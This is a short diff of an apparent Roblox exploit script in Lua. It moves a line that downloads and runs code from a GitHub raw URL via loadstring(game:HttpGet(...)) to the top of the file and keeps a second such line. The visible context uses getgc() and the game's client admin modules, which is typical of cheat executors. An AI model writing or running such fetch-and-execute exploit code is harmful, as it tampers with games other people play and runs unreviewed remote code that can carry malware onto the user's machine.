@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Scripty/refs/heads/main/Op.lua"))()
 local adm = require(
     game:GetService("ReplicatedStorage")
         :WaitForChild("ClientModules")
@@ -59,4 +60,3 @@ for _, v in pairs(getgc()) do
 end
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Premium/refs/heads/main/Best.lua"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Scripty/refs/heads/main/Op.lua"))()
